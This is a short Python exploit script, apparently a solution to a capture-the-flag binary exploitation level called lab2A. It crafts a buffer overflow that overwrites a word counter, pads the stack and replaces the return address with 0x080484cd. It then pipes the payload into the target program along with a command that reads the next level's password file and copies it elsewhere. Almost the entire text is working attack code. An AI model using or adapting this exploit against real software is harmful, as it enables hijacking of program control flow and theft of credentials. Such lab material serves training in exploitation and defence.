#!/usr/bin/env python
# coding: utf-8

import os
import struct

def prepare(buf):
	return '\\n'.join(x for x in buf) + '\\n'



first_word = "\xff"*15 # first world will overwrite the word counter
pad = "\x41"*23 		# 23 bytes of padding
ret_addr = struct.pack('<I',0x080484cd) # the new return address

# This will be our crafted buffer of words

crafted = first_word + prepare(pad) + prepare(ret_addr)

cmd = 'python -c \'print "%s"\'' % crafted
os.system('(%s; echo "cat /home/lab2end/.pass > /usr/slove/lab2end.pass") |' % cmd + '/home/gameadmin/lab2A')

print '[+] Password stored in /usr/slove/lab2end.pass'
